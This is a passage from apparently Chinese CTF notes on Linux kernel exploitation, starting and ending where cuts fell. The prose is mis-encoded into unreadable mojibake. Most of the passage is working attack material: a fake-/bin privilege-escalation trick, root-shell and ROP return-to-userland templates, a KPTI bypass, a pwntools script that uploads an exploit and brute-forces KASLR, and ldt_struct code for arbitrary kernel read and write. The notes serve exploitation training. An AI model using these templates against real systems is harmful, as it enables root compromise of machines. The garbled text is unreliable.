¹ç›®å½•ä¸‹ï¼Œè™½ç„¶binçš„æ‰€æœ‰è€…ä¸ºrootï¼Œä½†æ˜¯ç¼ºå¯ä»¥å¯¹binè¿›è¡Œæ”¹åï¼Œç„¶åæˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªbinç›®å½•ï¼Œé‡Œé¢æ”¾ä¸Šæˆ‘ä»¬ä¼ªé€ çš„å‘½ä»¤ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»¥rootæƒé™è°ƒç”¨è¿™ä¸ªä¼ªé€ çš„å‘½ä»¤äº†ï¼Œå¦‚ä¸‹ä¸ºæ‰€ç¤ºä¾‹å­ã€‚\n\n```bash\nmv bin evil_bin\nmkdir bin\necho \"#!/evil_bin/sh\" > /bin/power\necho \"/evil_bin/sh\" >> /bin/power\nexit\n```\n\n### (3)å¯†ç æœªè®¾ç½®\n\nå¦‚æœrootè´¦å·çš„å¯†ç æ²¡æœ‰è®¾ç½®çš„è¯ï¼Œç›´æ¥suå³å¯ç™»å½•åˆ°rootï¼Œéé¢„æœŸçš„ã€‚\n\n\n\n# å…«ã€æ¨¡æ¿\n\n## 1.ä¿å­˜çŠ¶æ€\n\n```c\nvoid saveStatus()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    printf(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\\n\");\n}\n```\n\n## 2.ç”¨æˆ·æ€èµ·Shell\n\n```c\nvoid getRootShell(void)\n{   \n    puts(\"\\033[32m\\033[1m[+] Backing from the kernelspace.\\033[0m\");\n\n    if(getuid())\n    {\n        puts(\"\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\");\n        exit(-1);\n    }\n\n    puts(\"\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\");\n    system(\"/bin/sh\");\n}\n```\n\n## 3.è¿”å›ç”¨æˆ·æ€\n\n### (1)æ²¡æœ‰KPTI\n\næ­£å¸¸çš„swapgså’Œiretq\n\nROPå¸ƒå±€å¦‚ä¸‹\n\n```c\nswapgs_ret\niretq\n&get_shell,\nuser_cs,\nuser_rflags,\nuser_sp,\nuser_ss\n```\n\n### (2)å­˜åœ¨KPTI\n\n[Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/240006#h3-2)\n\nä»`swapgs_restore_regs_and_return_to_usermode`å‡½æ•°æŸå¤„å¼€å§‹æ‰§è¡Œ\n\n```\nmov    rdi,rsp   //è¯¥å¤„å¼€å§‹æ‰§è¡Œ\nmov    rsp,QWORD PTR gs:0x6004\n```\n\nROPå¸ƒå±€å¦‚ä¸‹\n\n```\nswapgs_restore_regs_and_return_to_usermode+22,\n0,\n0,\n&get_shell,\nuser_cs,\nuser_rflags,\nuser_sp,\nuser_ss\n```\n\n## 4.çˆ†ç ´KASLR\n\nå‚è€ƒï¼š[ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£ - arttnba3's blog](https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/)\n\n### (1)POCé‡Œ\n\n```c\noffset = (argv[1]) ? atoi(argv[1]) : 0;\n\n\nROP[i++] = POP_RDI_RET + offset;\nROP[i++] = 0;\nROP[i++] = PREPARE_KERNEL_CRED + offset;\nROP[i++] = COMMIT_CREDS + offset;\nROP[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22 + offset;\n```\n\n### (2)æ‰“è¿œç¨‹çš„EXP\n\n```python\nfrom pwn import *\nimport base64\n#context.log_level = \"debug\"\n\nwith open(\"./exp\", \"rb\") as f:\n    exp = base64.b64encode(f.read())\n    \np = process('./run.sh')#remote(\"127.0.0.1\", 1234)\ntry_count = 1\nwhile True:\n    log.info(\"no.\" + str(try_count) + \" time(s)\")\n    p.sendline()\n    p.recvuntil(\"~ $\")\n\n    count = 0\n    for i in range(0, len(exp), 0x200):\n        p.sendline(\"echo -n \\\"\" + exp[i:i + 0x200].decode() + \"\\\" >> b64_exp\")\n        count += 1\n\n    for i in range(count):\n        p.recvuntil(\"~ $\")\n    \n    p.sendline(\"cat b64_exp | base64 -d > ./exploit\")\n    p.sendline(\"chmod +x ./exploit\")\n    randomization = (try_count % 1024) * 0x100000\n    log.info('trying randomization: ' + hex(randomization))\n    p.sendline(\"./exploit \" + str(randomization))\n    if not p.recvuntil(b\"Rebooting in 1 seconds..\", timeout=60):\n        break\n    log.warn('failed!')\n    try_count += 1\n\nlog.success('success to get the root shell!')\np.interactive()\n```\n\n## 5.retUsræ¨¡æ¿\n\n```C\nstruct trap_frame{\n    void *rip;\n    uint64_t cs;\n    uint64_t rflags;\n    void * rsp;\n    uint64_t ss;\n}__attribute__((packed));    // ä¿å­˜çŠ¶æ€çš„ç»“æ„ä½“\nstruct trap_frame status;     // ä¿å­˜çŠ¶æ€\n\n// å°†çŠ¶æ€ä¿å­˜åœ¨statusä¸­\nvoid save()                  \n{\n    asm(\n        \"mov %%ss, %0\\n\"\n        \"mov %%rsp, %1\\n\"\n        \"pushfq\\n\"\n        \"pop %2\\n\"\n        \"mov %%cs, %3\\n\"\n        :\"=r\"(status.ss),\"=r\"(status.rsp),\"=r\"(status.rflags),\"=r\"(status.cs)\n        :\n        :\"memory\"\n        );\n    status.rip = shell;\n}\n\nvoid retUsr()\n{\n    commit_creds(prepare_kernel_cred(0));\n    asm(\n        \"swapgs\\n\"\n        \"mov $status,%rsp\\n\"\n        \"iretq\"\n        );\n}\n```\n\n\n\n# ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“\n\nå‚è€ƒï¼š[ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3's blog](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x01-tty-ç³»åˆ—ç»“æ„ä½“)\n\n## 1.ttyç³»åˆ—ç»“æ„ä½“---kmalloc-1024\n\næ‰“å¼€è®¾å¤‡ï¼š`/dev/ptmx`\n\ntty_struct çš„é­”æ•°ä¸º `0x5401`ï¼Œä½äºè¯¥ç»“æ„ä½“çš„å¼€å¤´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¯¹è¯¥é­”æ•°çš„æœç´¢ä»¥é”å®šè¯¥ç»“æ„ä½“ã€‚\n\nä¸Šé¢**å †->å€ŸåŠ©ptmxè®¾å¤‡**è®²è¿‡äº†\n\n\n\n## 2.seq_operationsç»“æ„ä½“----kmalloc-32\n\næ‰“å¼€è®¾å¤‡ï¼š`proc/self/stat`\n\nè¯¥ç»“æ„ä½“å®šä¹‰äº `/include/linux/seq_file.h` å½“ä¸­ï¼Œå¤§å°ä¸º0x20\n\n```c\nstruct seq_operations {\n\tvoid * (*start) (struct seq_file *m, loff_t *pos);\n\tvoid (*stop) (struct seq_file *m, void *v);\n\tvoid * (*next) (struct seq_file *m, void *v, loff_t *pos);\n\tint (*show) (struct seq_file *m, void *v);\n};\n```\n\né€šè¿‡å‡½æ•°æŒ‡é’ˆæ³„éœ²åœ°å€ï¼Œå†åŠ«æŒstartå‡½æ•°æŒ‡é’ˆåå¯¹è¯¥è®¾å¤‡è¿›è¡Œè¯»å†™å³å¯è°ƒç”¨åŠ«æŒçš„startå‡½æ•°æŒ‡é’ˆï¼Œæ§åˆ¶ç¨‹åºæµç¨‹ã€‚è¯»å†™çš„æ—¶å€™å¯é€šè¿‡syscallåˆ›å»º`pt_regs`ç»“æ„ä½“æ¥å¸ƒç½®å†…æ ¸æ ˆç¯å¢ƒï¼Œç„¶åé€šè¿‡`swapgs_restore_regs_and_return_to_usermode`å‡½æ•°è¿”å›ç”¨æˆ·ç©ºé—´ã€‚\n\n[è¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›easykernelé¢˜è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/260055#h3-5)\n\n\n\n## 3.subprocess_infoç»“æ„ä½“---kmalloc-128\n\né€šè¿‡ä»¥ä¸‹è¯­å¥å¯ä»¥åˆ†é…å¾—åˆ°ä¸€ä¸ª`subprocess_info`ç»“æ„ä½“ï¼Œä¸åŒç‰ˆæœ¬å¤§å°ä¸åŒï¼Œå¦‚ä¸‹ç‰ˆæœ¬å½¢å¼çš„ä¸º0x60ï¼Œä½¿ç”¨kmalloc-128åˆ†é…å™¨\n\n```c\nsocket(22, AF_INET, 0);\n```\n\nç»“æ„ä½“\n\n```c\nstruct subprocess_info {\n    struct work_struct work;\n    struct completion *complete;\n    const char *path;\n    char **argv;\n    char **envp;\n    struct file *file;\n    int wait;\n    int retval;\n    pid_t pid;\n    int (*init)(struct subprocess_info *info, struct cred *new);\n    void (*cleanup)(struct subprocess_info *info);\n    void *data;\n} __randomize_layout;\n```\n\nè¯¥ç»“æ„ä½“åœ¨åˆ†é…æ—¶æœ€ç»ˆä¼šè°ƒç”¨å…¶ä¸­çš„`void (*cleanup)(struct subprocess_info *info);`å‡½æ•°æŒ‡é’ˆï¼Œæ‰€ä»¥å¦‚æœå­˜åœ¨ä¸€ä¸ªUAFå’Œæ¡ä»¶ç«äº‰ï¼Œåœ¨åˆ†é…æ—¶å¯åŠ¨å¦ä¸€ä¸ªçº¿ç¨‹ä¸æ–­ä¿®æ”¹è¯¥å‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆå°±èƒ½åŠ«æŒç¨‹åºæµï¼Œå†åˆ©ç”¨ä¸€äº›gadgetå°±å¯ä»¥æ§åˆ¶å¾—åˆ°ã€‚\n\n[SCTF flying_kernel å‡ºé¢˜æ€»ç»“ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/264563#h2-2)\n\n## 4.ldt_structç»“æ„ä½“---kmalloc-16\n\nå‚è€ƒï¼š[åœ¨ 2021 å¹´å†çœ‹ ciscn_2017 - babydriverï¼ˆä¸‹ï¼‰ï¼šKPTI bypassã€ldt_struct çš„åˆ©ç”¨ã€pt_regs é€šç”¨å†…æ ¸ROPè§£æ³• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/266897#h3-5)\n\n### (1)å‰ç½®çŸ¥è¯†\n\n#### ç»“æ„ä½“\n\n`ldt`æ˜¯å³å±€éƒ¨æ®µæè¿°ç¬¦è¡¨ï¼ˆLocal Descriptor Tableï¼‰ï¼Œå­˜æ”¾ç€è¿›ç¨‹çš„æ®µæè¿°ç¬¦ï¼Œåœ¨å†…æ ¸ä¸­æœ‰ç»“æ„ä½“`ldt_struct`ä¸ä¹‹å¯¹åº”ã€‚å¤§å°ä¸º0x10ã€‚\n\nå¦‚ä¸‹ç»“æ„ä½“\n\n```c\n//v5.17 /arch/x86/include/asm/mmu_context.h\nstruct ldt_struct {\n\t/*\n\t * Xen requires page-aligned LDTs with special permissions.  This is\n\t * needed to prevent us from installing evil descriptors such as\n\t * call gates.  On native, we could merge the ldt_struct and LDT\n\t * allocations, but it's not worth trying to optimize.\n\t */\n\tstruct desc_struct\t*entries;\n\tunsigned int\t\tnr_entries;\n\n\t/*\n\t * If PTI is in use, then the entries array is not mapped while we're\n\t * in user mode.  The whole array will be aliased at the addressed\n\t * given by ldt_slot_va(slot).  We use two slots so that we can allocate\n\t * and map, and enable a new LDT without invalidating the mapping\n\t * of an older, still-in-use LDT.\n\t *\n\t * slot will be -1 if this LDT doesn't have an alias mapping.\n\t */\n\tint\t\t\tslot;\n};\n```\n\nè¯¥ç»“æ„ä½“å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨`SYS_modify_ldt`æ¥æ“æ§ï¼Œæƒ³è¦è°ƒç”¨è¯¥ç³»ç»Ÿè°ƒç”¨å·éœ€è¦ç¼–è¯‘æ—¶å¼€å¯å¦‚ä¸‹è®¾ç½®ï¼Œä¸è¿‡ä¸€èˆ¬éƒ½æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä»v4.3ç‰ˆæœ¬æ‰å¼€å§‹è¾ƒä¸ºæ­£å¼çš„ä¸€ä¸ªç¼–è¯‘è®¾ç½®\n\n```\nCONFIG_MODIFY_LDT_SYSCALL=y\n```\n\n#### ç³»ç»Ÿè°ƒç”¨å‡½æ•°\n\nå…·ä½“çš„å‡½æ•°è°ƒç”¨å¦‚ä¸‹\n\n```c\n//v5.17 /arch/x86/kernel/ldt.c\nSYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,\n\t\tunsigned long , bytecount)\n{\n\tint ret = -ENOSYS;\n\n\tswitch (func) {\n\tcase 0:\n\t\tret = read_ldt(ptr, bytecount);//è¯»å–\n\t\tbreak;\n\tcase 1:\n\t\tret = write_ldt(ptr, bytecount, 1);//å†™å…¥\n\t\tbreak;\n\tcase 2:\n\t\tret = read_default_ldt(ptr, bytecount);\n\t\tbreak;\n\tcase 0x11:\n\t\tret = write_ldt(ptr, bytecount, 0);\n\t\tbreak;\n\t}\n\t/*\n\t * The SYSCALL_DEFINE() macros give us an 'unsigned long'\n\t * return type, but tht ABI for sys_modify_ldt() expects\n\t * 'int'.  This cast gives us an int-sized value in %rax\n\t * for the return code.  The 'unsigned' is necessary so\n\t * the compiler does not try to sign-extend the negative\n\t * return codes into the high half of the register when\n\t * taking the value from int->long.\n\t */\n\treturn (unsigned int)ret;\n}\n```\n\nä¹Ÿå°±æ˜¯ä¼ å…¥syscallç›¸å…³å‚æ•°ï¼Œä¼šè°ƒç”¨ä¸åŒå‡½æ•°ï¼Œ0å¯¹åº”`read_ldt`ï¼Œ1å¯¹åº”`write_ldt`(å…¶å®0x11çš„ä¹Ÿå·®ä¸å¤šï¼Œå°±æ˜¯`oldmode`è®¾ç½®ä¸º0äº†è€Œå·²ï¼Œå…·ä½“çš„è¿˜å¾—ä¾æ®æºç è¿›è¡Œåˆ†æ)ï¼Œä¾æ­¤çœ‹ä»£ç ç±»ä¼¼å¦‚ä¸‹\n\n```c\n//read_ldtä»ldt_struct->entriesè¯»å–8å­—èŠ‚ç»™buf\nsyscall(SYS_modify_ldt, 0, &buf, 8);\n\n//write_ldtä¾æ®ä¼ å…¥çš„bufæ•°æ®å’Œ sizeof(desc)åˆ›å»ºä¸€ä¸ªæ–°çš„ldt_structç»“æ„ä½“\nsyscall(SYS_modify_ldt, 1, &buf, sizeof(buf));\n```\n\n### (2)å®ç°ä»»æ„è¯»å–\n\nä¸»è¦çœ‹`write_ldt`å’Œ`read_ldt`å‡½æ•°ï¼Œç”±äºè°ƒç”¨`write_ldt`å‡½æ•°æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„`ldt_struct`ä¸€äº›å’Œåˆ©ç”¨æ— å…³çš„ä»£ç å°±å…ˆçœç•¥äº†\n\n```c\n//v5.17 /arch/x86/kernel/ldt.c\n\nstatic int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)\n{\n\tstruct mm_struct *mm = current->mm;\n\tstruct ldt_struct *new_ldt, *old_ldt;\n\tunsigned int old_nr_entries, new_nr_entries;\n\tstruct user_desc ldt_info;\n\tstruct desc_struct ldt;\n\tint error;\n\n    //.........//\n    //ä»ç”¨æˆ·æ•°æ®æ‹·è´sizeof(ldt_info)æ•°æ®ç»™ldt_info\n\tif (copy_from_user(&ldt_info, ptr, sizeof(ldt_info)))\n\t\tgoto out;\n\n\t//.........//\n    //ä¾æ®ä¸€äº›æ¡ä»¶æ¥è¿›è¡Œå¤„ç†\n\tif ((oldmode && !ldt_info.base_addr && !ldt_info.limit) ||\n\t    LDT_empty(&ldt_info)) {\n\t\t/* The user wants to clear the entry. */\n\t\tmemset(&ldt, 0, sizeof(ldt));\n\t} else {\n        //seg_32bitæœ€å¥½ç›´æ¥è®¾ç½®ä¸º1,ä¸è®¾ç½®å…¶å®ä¹Ÿä¸ä¼šè¿›å»å•¦,\n        //allow_16bit_segmentsåŸºæœ¬éƒ½ä¼šè¿”å›true\n\t\tif (!ldt_info.seg_32bit && !allow_16bit_segments()) {\n\t\t\terror = -EINVAL;\n\t\t\tgoto out;\n\t\t}    \n/*\nstatic bool allow_16bit_segments(void)\n{\n\tif (!IS_ENABLED(CONFIG_X86_16BIT))\n\t\treturn false;\n\n#ifdef CONFIG_XEN_PV\n\n\t * Xen PV does not implement ESPFIX64, which means that 16-bit\n\t * segments will not work correctly.  Until either Xen PV implements\n\t * ESPFIX64 and can signal this fact to the guest or unless someone\n\t * provides compelling evidence that allowing broken 16-bit segments\n\t * is worthwhile, disallow 16-bit segments under Xen PV.\n\tif (xen_pv_domain()) {\n\t\tpr_info_once(\"Warning: 16-bit segments do not work correctly in a Xen PV guest\\n\");\n\t\treturn false;\n\t}\n#endif\n\n\treturn true;\n}\n*/\n\t\t//ä¸€äº›ç›¸å…³çš„è®¾ç½®,ä¼šå¯¼è‡´ldté‡Œçš„æ•°æ®è¢«æ›´æ”¹\n\t\tfill_ldt(&ldt, &ldt_info);\n\t\tif (oldmode)\n\t\t\tldt.avl = 0;\n\t}\n    \n/*\nstatic inline void fill_ldt(struct desc_struct *desc, const struct user_desc *info)\n{\n\tdesc->limit0\t\t= info->limit & 0x0ffff;\n\n\tdesc->base0\t\t= (info->base_addr & 0x0000ffff);\n\tdesc->base1\t\t= (info->base_addr & 0x00ff0000) >> 16;\n\n\tdesc->type\t\t= (info->read_exec_only ^ 1) << 1;\n\tdesc->type\t       |= info->contents << 2;\n\t//Set the ACCESS bit so it can be mapped RO\n\tdesc->type\t       |= 1;\n\n\tdesc->s\t\t\t= 1;\n\tdesc->dpl\t\t= 0x3;\n\tdesc->p\t\t\t= info->seg_not_present ^ 1;\n\tdesc->limit1\t\t= (info->limit & 0xf0000) >> 16;\n\tdesc->avl\t\t= info->useable;\n\tdesc->d\t\t\t= info->seg_32bit;\n\tdesc->g\t\t\t= info->limit_in_pages;\n\n\tdesc->base2\t\t= (info->base_addr & 0xff000000) >> 24;\n\t//\n\t * Don't allow setting of the lm bit. It would confuse\n\t * user_64bit_mode and would get overridden by sysret anyway.\n\tdesc->l\t\t\t= 0;\n}\n*/\n\n    //.......//\n    //ä¾æ®sizeof(ldt_struct)ç”¨kmallocç”³è¯·chunkä½œä¸ºnew_ldt\n\tnew_ldt = alloc_ldt_struct(new_nr_entries);\n\n/*\nstatic struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)\n{\n\tstruct ldt_struct *new_ldt;\n\tunsigned int alloc_size;\n\n\t//.....//\n\t//ä¾æ®sizeof(ldt_struct)ç”¨kmallocç”³è¯·chunkä½œä¸ºnew_ldt\n\tnew_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL_ACCOUNT);\n\t//....//\n\t \n\tif (alloc_size > PAGE_SIZE)\n\t\tnew_ldt->entries = __vmalloc(alloc_size, GFP_KERNEL_ACCOUNT | __GFP_ZERO);\n\telse\n\t\tnew_ldt->entries = (void *)get_zeroed_page(GFP_KERNEL_ACCOUNT);\n\n\tif (!new_ldt->entries) {\n\t\tkfree(new_ldt);\n\t\treturn NULL;\n\t}\n\n\t//The new LDT isn't aliased for PTI yet. \n\tnew_ldt->slot = -1;\n\tnew_ldt->nr_entries = num_entries;\n\treturn new_ldt;\n}\n*/\n    \n    //.......//\n    \n    //è®¾ç½®æ–°ldt_structç»“æ„ä½“çš„entriesæŒ‡é’ˆ\n    if (old_ldt)\n        memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE);\n\n    //ä»ldtç»“æ„ä½“ä¸­æ‹·è´8ä¸ªå­—èŠ‚åˆ°å¯¹åº”ä½ç½®\n    new_ldt->entries[ldt_info.entry_number] = ldt;\n\n    //......///\n    \n    install_ldt(mm, new_ldt);\n\tunmap_ldt_struct(mm, old_ldt);\n\tfree_ldt_struct(old_ldt);\n    //......//\nout:\n\treturn error;\n}\n```\n\n- å°†æˆ‘ä»¬çš„ä¼ å…¥çš„æ•°æ®æŒ‡é’ˆ`ptr`ï¼Œå½“ä½œä¸€ä¸ª`user_desc`ç»“æ„ä½“æ‹·è´ç»™`ldt_info`\n- ç„¶åä¾æ®`ldt_info`æ¥è®¾ç½®`desc_struct`ç»“æ„ä½“`ldt`\n- ä¹‹åä¾æ®`sizeof(ldt_struct)`ç”¨`kmalloc`ç”³è¯·`chunk`ä½œä¸º`new_ldt`\n- å¦‚æœå­˜åœ¨`old_ldt`ï¼Œé‚£ä¹ˆå°±å°†`old_ldt->entriesd`çš„æ•°æ®çš„æ‹·è´ç»™æ–°çš„`new_ldt->entries`\n- æœ€åå°†`ldt`(8ä¸ªå­—èŠ‚)çš„å†…å®¹èµ‹å€¼ç»™`new_ldt->entries[ldt_info.entry_number]`\n- åœ¨é€€å‡ºå‰è¿˜ä¼šæ’å…¥`new_ldt`å¹¶ä¸”è§£å¼€`old_ldt`ï¼Œé‡Šæ”¾`old_ldt`\n\n```c\n//v5.17 /arch/x86/include/uapi/asm/ldt.h\nstruct user_desc {\n\tunsigned int  entry_number;\n\tunsigned int  base_addr;\n\tunsigned int  limit;\n\tunsigned int  seg_32bit:1;\n\tunsigned int  contents:2;\n\tunsigned int  read_exec_only:1;\n\tunsigned int  limit_in_pages:1;\n\tunsigned int  seg_not_present:1;\n\tunsigned int  useable:1;\n#ifdef __x86_64__\n\t/*\n\t * Because this bit is not present in 32-bit user code, user\n\t * programs can pass uninitialized values here.  Therefore, in\n\t * any context in which a user_desc comes from a 32-bit program,\n\t * the kernel must act as though lm == 0, regardless of the\n\t * actual value.\n\t */\n\tunsigned int  lm:1;\n#endif\n};\n\n\n//v5.17 /arch/x86/include/asm/desc_defs.h\nstruct desc_struct {\n\tu16\tlimit0;\n\tu16\tbase0;\n\tu16\tbase1: 8, type: 4, s: 1, dpl: 2, p: 1;\n\tu16\tlimit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;\n} __attribute__((packed));\n```\n\næ¯”å¦‚æœ‰ä¸ªUAFæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©è¯¥å‡½æ•°ï¼Œç”³è¯·0x10å¤§å°çš„å †å—ï¼Œä¿®æ”¹å…¶`entries`æŒ‡é’ˆï¼Œå†å€ŸåŠ©`read_ldt`å‡½æ•°è¿›è¡Œè¯»å–\n\n```c\nstatic int read_ldt(void __user *ptr, unsigned long bytecount)\n{\n\tstruct mm_struct *mm = current->mm;\n\tunsigned long entries_size;\n\tint retval;\n\n    //......//\n    //entries_sizeè‚¯å®šå¤§äº8192,é‚£ä¹ˆè‡³å°‘å¯æ‹·è´8192ä¸ªå­—èŠ‚\n    //#define LDT_ENTRIES    8192\n    entries_size = mm->context.ldt->nr_entries * LDT_ENTRY_SIZE;\n    if (entries_size > bytecount)\n\t\tentries_size = bytecount;\n\tif (copy_to_user(ptr, mm->context.ldt->entries, entries_size)) {\n\t\tretval = -EFAULT;\n\t\tgoto out_unlock;\n\t}\n    //.....//\n\nout_unlock:\n\tup_read(&mm->context.ldt_usr_sem);\n\treturn retval;\n}\n```\n\n- å³è·å–å½“å‰è¿›ç¨‹ä¸­çš„`ldt_struct`ç»“æ„ä½“çš„`entries`æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ï¼Œæ‹·è´`bytecount`ä¸ªå­—èŠ‚ç»™ç”¨æˆ·\n\né‚£ä¹ˆå½“å¦‚ä¸Šè¿°æ‰€ç¤ºï¼Œå€ŸåŠ©UAFä¿®æ”¹äº†`entries`æŒ‡é’ˆä¹‹åï¼Œå°±å¯ä»¥è¿›è¡Œä»»æ„åœ°å€è¯»å–æœ€å°‘å¯åˆ°è¾¾8192ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚\n\nå¦‚æœæ²¡æœ‰åœ°å€çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨çˆ†ç ´çš„æ–¹æ³•æ¥è¯»å–å†…æ ¸åœ°å€ï¼Œå› ä¸ºå¦‚æœæ²¡æœ‰å‘½ä¸­å†…æ ¸ç©ºé—´`copy_to_user`ä¼šè¿”å›é0å€¼ï¼Œä½†æ˜¯å†…æ ¸ä¸ä¼šå´©æºƒï¼Œå€ŸåŠ©è¿™ç‚¹ç‰¹æ€§å¯ä»¥ç”¨æ¥çˆ†ç ´å†…æ ¸ç©ºé—´ã€‚\n\nä½†æ˜¯å¦‚æœå­˜åœ¨`harden_usercopy`å’Œ`KASLR`ï¼Œæœ€å¥½è¿˜æ˜¯å€ŸåŠ©`page_offset_base`å’Œ`fork`æ¥ä»çº¿æ€§åˆ†é…åŒºä¸­æœç´¢æ•°æ®ï¼Œä¸ç„¶å½“`copy_to_user`çš„æºåœ°å€ä¸ºå†…æ ¸ .text æ®µï¼ˆ_stext, _etextï¼‰æ—¶æˆ–è€…çº¿æ€§åˆ†é…åŒºä¸­çš„æ•°æ®è¾ƒä¸ºç‰¹æ®Šæ—¶ä¼šå¼•èµ·`kernel panic`ï¼Œè‡´ä½¿å†…æ ¸å´©æºƒã€‚\n\nåŸç†å°±æ˜¯åœ¨`fork`æ—¶æœ€ç»ˆè°ƒç”¨åˆ°çš„æ˜¯`ldt_dup_context`å‡½æ•°ï¼Œè¯¥å‡½æ•°æœ‰å¦‚ä¸‹æ“ä½œ\n\n```c\nmemcpy(new_ldt->entries, old_mm->context.ldt->entries,\n           new_ldt->nr_entries * LDT_ENTRY_SIZE);\n```\n\nä¼šå°†çˆ¶è¿›ç¨‹çš„æ‹·è´ç»™å­è¿›ç¨‹ï¼Œå®Œå…¨åœ¨å†…æ ¸ä¸­çš„æ“ä½œï¼Œä¸ä¼šè§¦å‘`hardened usercopy`çš„æ£€æŸ¥ï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨çˆ¶è¿›ç¨‹ä¸­è®¾å®šå¥½æœç´¢çš„åœ°å€ä¹‹åæ‰“å¼€å­è¿›ç¨‹æ¥é€šè¿‡`read_ldt()`è¯»å–æ•°æ®å³å¯\n\n```c\nint pipe_fd[2];\nsize_t kernel_base = 0;\nsize_t kernel_offset;\npipe(pipe_fd);\nsize_t searchAddr;\n\n//æœç´¢page_offset_base\nwhile(1)\n{\n    myChunk.len = 0x8;\n    myChunk.idx = 0x0;\n    myChunk.data = &page_offset_base;//change the entries\n    editFun(fd,&myChunk);\n    retval = syscall(SYS_modify_ldt, 0, &desc, 8);//read_ldt 8 bytes form entries\n    if (retval >= 0)//judge yes or no\n        break;\n    page_offset_base += 0x2000000;\n}\nprintf(\"\\033[32m\\033[1m[+] Found page_offset_base: \\033[0m%lx\\n\", page_offset_base);\n\n\n//ä»page_offset_baseä¸­æœç´¢å†…æ ¸å‡½æ•°åœ°å€\nsearchAddr = page_offset_base;\nwhile(1)\n{\n    myChunk.idx = 0x0;\n    myChunk.data = &searchAddr\n    editFunc(fd, &myChunk);//ä¿®æ”¹entriesæŒ‡é’ˆ\n    retval = fork();\n    if (!retval)    // child\n    {\n        //è¯»å–0x8000æ•°æ®\n        syscall(SYS_modify_ldt, 0, buf, 0x8000);\n        for (int i = 0; i < 0x1000; i++)\n        {\n            //é€‰å–ç‰¹å¾æ•°æ®\n            if ((buf[i] >= 0xffffffff81000000)  && ((buf[i] & 0xfff) == 0x030))\n            {\n                kernel_base = buf[i] -  0x030;\n                kernel_offset = kernel_base - 0xffffffff81000000;\n                printf(\"\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\033[32m\\033[1m at \\033[0m%p\\n\", kernel_base, search_addr);\n                printf(\"\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n\", kernel_offset);\n                break;\n            }\n        }\n        write(pipe_fd[1], &kernel_base, 8);\n        exit(0);\n    }\n    wait(NULL);\n    read(pipe_fd[0], &kernel_base, 8);\n    if (kernel_base)\n        break;\n    search_addr += 0x8000;\n}\nkernel_offset = kernel_base - 0xffffffff81000000;\n```\n\n\n\n### (3)å®ç°ä»»æ„åœ°å€å†™\n\nåŒæ ·çš„è¿˜æ˜¯å…³äº`entries`æŒ‡é’ˆï¼Œå¦‚ä¸‹åœ¨`write_ldt`å‡½æ•°ä¸­çš„ä»£ç ï¼Œ`entry_number`å¯æ§ï¼Œ`ldt`ä¸å¤ªå¯æ§ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆ`write_ldt`ä¸€ä¸ª`new_nr_entries`å‡ºæ¥ï¼Œç„¶åå†ä¸‹ä¸€æ¬¡`write_ldt`å°±å¯ä»¥ç»™`old_nr_entries`èµ‹å€¼ï¼Œè¿›è€Œåœ¨`memcpy`çš„æ—¶å€™æ‹·è´å¤§é‡æ•°æ®ã€‚\n\n```c\nold_nr_entries = old_ldt ? old_ldt->nr_entries : 0;\nnew_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);\n//...//\n//è®¾ç½®æ–°ldt_structç»“æ„ä½“çš„entriesæŒ‡é’ˆ\n //#define LDT_ENTRY_SIZE    8\nif (old_ldt)\n    memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE);\n\n//ä»ldtç»“æ„ä½“ä¸­æ‹·è´8ä¸ªå­—èŠ‚åˆ°å¯¹åº”ä½ç½®\nnew_ldt->entries[ldt_info.entry_number] = 